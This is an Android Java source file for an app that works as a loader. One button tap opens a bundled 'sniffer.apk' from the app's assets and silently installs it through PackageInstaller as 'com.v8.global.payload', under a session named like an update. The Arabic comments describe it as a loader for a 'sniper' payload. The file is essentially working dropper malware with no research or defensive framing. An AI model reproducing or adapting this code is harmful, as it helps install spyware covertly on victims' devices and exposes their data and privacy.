package com.v8.global.sniffer;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnInstall = findViewById(R.id.btn_perm); // استخدمنا نفس الأيدي القديم btn_perm
        btnInstall.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    // اللوادر راح يفتح ملف القناص الموجود بالـ assets
                    InputStream is = getAssets().open("sniffer.apk");
                    // ملاحظة: التطبيق اللي راح يتثبت لازم يكون له باكج نيم مختلف شوية حتى ما يصير تعارض
                    installPackage(MainActivity.this, is, "com.v8.global.payload");
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    public void installPackage(Context context, InputStream in, String targetPackageName) {
        try {
            PackageInstaller installer = context.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            params.setAppPackageName(targetPackageName);

            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            OutputStream out = session.openWrite("V8_Update_Session", 0, -1);
            byte[] buffer = new byte[65536];
            int n;
            while ((n = in.read(buffer)) != -1) {
                out.write(buffer, 0, n);
            }
            session.fsync(out);
            out.close();

            Intent intent = new Intent(context, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_MUTABLE);
            session.commit(pendingIntent.getIntentSender());
            session.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
